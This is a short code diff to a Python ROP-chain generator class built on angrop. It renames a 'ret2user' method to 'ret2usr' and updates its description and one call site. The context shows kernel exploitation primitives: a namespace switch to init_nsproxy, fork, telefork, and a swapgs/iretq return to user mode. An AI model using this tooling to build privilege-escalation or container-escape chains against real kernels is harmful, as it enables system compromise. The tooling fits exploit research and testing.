@@ -428,7 +428,7 @@ class RopGeneratorAngrop:
           description="switch_task_namespaces(find_task_by_vpid(ARG_vpid), init_nsproxy)",
           gadgets=items)
 
-    def rop_action_ret2user(
+    def rop_action_ret2usr(
         self,
         user_rip: RopChainArgument,
         user_cs: RopChainArgument,
@@ -446,7 +446,7 @@ class RopGeneratorAngrop:
         iretq = self._find_gadget_by_bytes(IRETQ_BYTES)
 
         return RopAction(
-          description="ret2user(ARG_user_rip, ARG_user_cs, ARG_user_rflags, ARG_user_sp, ARG_user_ss)",
+          description="ret2usr(ARG_user_rip, ARG_user_cs, ARG_user_rflags, ARG_user_sp, ARG_user_ss)",
           gadgets=[
             RopChainOffset(
               kernel_offset=swapgs_ret - KERNEL_BASE_ADDRESS,
@@ -533,7 +533,7 @@ if __name__ == "__main__":
         RopChainArgument(0), RopChainArgument(1))
     action_fork = rop_generator.rop_action_fork()
     action_telefork = rop_generator.rop_action_telefork(RopChainArgument(0))
-    action_trampoline_ret = rop_generator.rop_action_ret2user(
+    action_trampoline_ret = rop_generator.rop_action_ret2usr(
       RopChainArgument(0), RopChainArgument(1), RopChainArgument(2),
       RopChainArgument(3), RopChainArgument(4))
 
